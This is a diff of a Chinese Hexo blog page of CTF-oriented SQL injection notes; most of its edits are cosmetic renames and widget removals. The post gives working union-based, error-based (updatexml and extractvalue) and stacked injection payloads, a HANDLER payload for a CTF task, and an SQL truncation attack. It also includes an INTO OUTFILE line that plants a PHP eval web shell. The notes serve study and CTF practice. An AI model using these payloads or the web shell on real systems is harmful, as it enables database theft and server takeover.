@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入笔记, Jlan&#39;s Little World">
+    <meta name="keywords" content="SQL注入笔记, J1an&#39;s Little World">
     <meta name="description" content="SQL注入1、通过order by爆出字段数
 2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置
 3、information_schema数据库，为mysql自带数据库，">
@@ -19,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入笔记 | Jlan&#39;s Little World</title>
+    <title>SQL注入笔记 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -47,8 +47,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -66,7 +64,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -87,55 +85,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -170,7 +124,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -193,55 +147,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -405,6 +315,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -418,26 +331,31 @@
 <span id="more"></span>
 
 <p>爆破库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database()</span><br><span class="line">//靠错误爆出库名</span><br><span class="line">and exists(select * from aaa)</span><br><span class="line">//aaa表并不存在，此时会报错停止并返回数据库名.aaa</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,database()
+&#x2F;&#x2F;靠错误爆出库名
+and exists(select * from aaa)
+&#x2F;&#x2F;aaa表并不存在，此时会报错停止并返回数据库名.aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>爆破表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">and exists(select * from 表名)//爆破出表名</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()
+and exists(select * from 表名)&#x2F;&#x2F;爆破出表名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>爆破列名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;想查询的表名&quot;</span><br><span class="line">and exists(select 列名 from 已知表名)//爆破出列名</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;想查询的表名&quot;
+and exists(select 列名 from 已知表名)&#x2F;&#x2F;爆破出列名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>4、报错注入</p>
 <p>（1）updatexml：更新XML文档的函数</p>
 <p>语法：<strong>updatexml（文档类型，xpath路径，更新的内容）</strong></p>
 <p>例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0x0a,concat(0x0a,(select database())),’1’)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and updatexml(0x0a,concat(0x0a,(select database())),’1’)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>0x0a代表换行符，concat拼接</p>
 <p>拼接目的为使得查询结果能完全显示出来</p>
 <p>（2）extractvalue：对XML文档进行查询的函数</p>
 <p>语法：<strong>extractvalue（文档类型，xpath路径）</strong></p>
 <p>报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= &#x27;sqli&#x27;))))</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D; &#39;sqli&#39;))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分</p>
 <p>​    例题：CTFHub技能树web-SQL注入-报错注入</p>
@@ -460,7 +378,7 @@
 <p>6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取</p>
 <p>7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)</p>
 <p>写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ‘&lt;?php eval($_POST[cmd]);?&gt;’ into outfile或dumpfile &#x27;绝对路径&#x27;;//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ‘&lt;?php eval($_POST[cmd]);?&gt;’ into outfile或dumpfile &#39;绝对路径&#39;;&#x2F;&#x2F;建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>8、关键词绕过：通过</p>
 <p>（1）、set@a：设定一个语句变量 set@sql=0x16进制数</p>
@@ -468,19 +386,33 @@
 <p>（3）、execute :执行一个sql语句 execute execsql</p>
 <p>由于设定语句变量时，mysql会自动将16进制数据转换为文字</p>
 <p>9、零碎</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">to_base64(内容)//该语句将内容经过base64编码后输出</span><br><span class="line">replace(ori,old,new)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">to_base64(内容)&#x2F;&#x2F;该语句将内容经过base64编码后输出
+replace(ori,old,new)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a,/**/可代替空格</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">%0a,&#x2F;**&#x2F;可代替空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--+，%23，#将后面的语句注释</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--+，%23，#将后面的语句注释<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>10、SQL约束攻击</p>
 <p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> userId <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;test            &#x27;</span><span class="operator">/</span><span class="operator">/</span>看这里有很多空格</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> userId <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'test            '</span><span class="token comment">//看这里有很多空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>上述代码和username = ‘test’结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“<strong>字符串比较</strong>”期间进行的。这是因为，<strong>SQL会在内部使用空格来填充字符串</strong>，<strong>以便在比较之前使其它们的长度保持一致</strong>。</p>
 <p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT *</span></span><br><span class="line"><span class="string">          FROM users</span></span><br><span class="line"><span class="string">          WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(mysql_num_rows(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password)</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//注册示例代码
+<span class="token prolog">&lt;?php
+$username = mysql_real_escape_string($_GET['username']);
+$password = mysql_real_escape_string($_GET['password']);
+$query = "SELECT *
+          FROM users
+          WHERE username='$username'";
+$res = mysql_query($query, $database);
+if($res) &#123;
+  if(mysql_num_rows($res) > 0) &#123;
+  &#125;
+  else &#123;
+    $query = "INSERT INTO users(username, password)
+?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。</p>
 <p>主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将”admin+[大量空格]11”删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。</p>
@@ -488,13 +420,25 @@
 <p>当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。</p>
 <p><strong>HANDLER语句查询</strong></p>
 <p>出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>知识点：handler语句查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">
+HANDLER tbl_name OPEN [ [AS] alias]
+ 
+HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+ 
+HANDLER tbl_name CLOSE
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>构造出语句如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">1&#x27;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:
+1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
@@ -519,7 +463,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -542,7 +486,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -598,39 +542,6 @@
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -681,7 +592,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -734,7 +645,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -765,6 +676,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -873,69 +787,15 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -970,7 +830,7 @@
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -978,10 +838,8 @@
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -990,9 +848,7 @@
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1152,6 +1008,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1178,8 +1042,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
